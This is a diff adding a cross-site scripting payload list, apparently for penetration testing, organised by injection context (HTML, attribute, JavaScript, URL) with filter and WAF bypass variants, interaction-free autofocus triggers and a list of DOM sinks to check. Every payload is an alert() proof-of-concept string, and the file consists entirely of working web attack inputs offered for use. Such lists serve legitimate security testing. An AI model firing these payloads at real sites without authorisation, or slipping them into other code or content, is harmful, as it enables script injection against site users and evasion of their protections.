@@ -1,0 +1,56 @@
+# XSS payloads organized by injection context.
+# Use grep on the ##HEADER to isolate a context set.
+# Test each against a benign marker; promote to PoC only after reflection is confirmed.
+
+## HTML_CONTEXT
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<details open ontoggle=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<marquee onstart=alert(1)>
+<video><source onerror="alert(1)">
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+
+## ATTRIBUTE_CONTEXT
+" autofocus onfocus=alert(1) x="
+' onfocus=alert(1) autofocus='
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+" onmouseover=alert(1) x="
+
+## JAVASCRIPT_CONTEXT
+';alert(1);//
+";alert(1);//
+</script><script>alert(1)</script>
+${alert(1)}
+{{constructor.constructor('alert(1)')()}}
+`${alert(1)}`
+
+## URL_CONTEXT
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+## WAF_BYPASS
+<scr<script>ipt>alert(1)</script>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
+<svg/onload=alert(1)>
+<IMG SRC=javascript:alert("XSS")>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x:alert(1) onerror=eval(src)>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+
+## AUTOFOCUS_INTERACTIONLESS
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<input autofocus onfocus=alert(1)>
+
+## DOM_SINKS_TO_CHECK
+# document.write, innerHTML, outerHTML, insertAdjacentHTML
+# eval, Function, setTimeout/setInterval with string arg
+# location, location.href, window.open
+# jQuery $() with html() or .append()
